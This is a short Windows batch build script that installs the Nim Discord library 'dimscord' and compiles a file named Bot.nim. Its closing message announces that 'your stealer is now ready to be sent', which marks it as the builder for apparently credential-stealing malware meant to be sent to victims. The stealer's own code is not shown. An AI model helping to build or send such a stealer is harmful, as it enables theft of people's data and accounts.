@echo off
cls

echo.
echo [92mInstalling nim modules...[0m
timeout /t 5
nimble install dimscord

echo.
echo [92mCompiling source...[0m
timeout /t 5
nim c .\Bot.nim

echo.
echo.
echo [92mCompiled successfully![0m Your stealer is now ready to be sent. 
echo.
echo.
